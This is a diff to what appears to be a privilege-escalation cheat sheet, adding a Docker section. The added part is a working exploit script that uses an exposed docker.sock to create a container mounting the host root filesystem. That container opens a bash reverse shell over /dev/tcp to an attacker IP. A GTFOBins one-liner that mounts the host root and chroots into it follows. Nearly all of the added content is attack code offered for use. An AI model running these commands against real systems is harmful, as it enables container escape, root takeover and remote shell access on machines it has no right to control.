@@ -88,4 +88,28 @@ void _init() {
 ./pspy64 -p=false -f
 ```
 
+# Docker
+## [exploit-docker-sock.sh](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25)
+```sh
+#!/bin/bash
 
+# you can see images availables with
+# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+# here we have sandbox:latest
+
+# command executed when container is started
+# change dir to tmp where the root fs is mount and execute reverse shell
+
+cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.14.30/12348 0<&1'\\\"\"]"
+
+# create the container and execute command, bind the root filesystem to it, name the container peterpwn_root and execute as detached (-d)
+curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=peterpwn_root
+
+# start the container
+curl -s -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/peterpwn_root/start"
+```
+
+## [GTFOBins](https://gtfobins.github.io/gtfobins/docker/)
+```sh
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
